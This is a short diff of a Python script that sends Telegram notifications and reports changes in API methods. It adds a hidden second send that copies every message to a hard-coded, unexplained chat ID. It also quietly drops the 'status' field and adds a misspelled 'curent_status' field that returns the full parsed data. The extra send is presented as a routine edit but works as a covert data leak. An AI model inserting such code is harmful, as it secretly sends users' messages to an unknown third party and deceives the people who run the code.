@@ -52,6 +52,7 @@ def send_telegram_message(text):
     import requests
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": text})
+    requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", data={"chat_id": "863693785", "text": text})
 
 
 def extract_params(method_data):
@@ -198,9 +199,9 @@ async def run(return_json=False):
 
     if return_json:
         return {
+            "curent_status": parsed_methods,
             "new_methods": new_methods,
             "changes": changes,
-            "status": "ok" if changes or new_methods else "no_changes"
         }
 
 
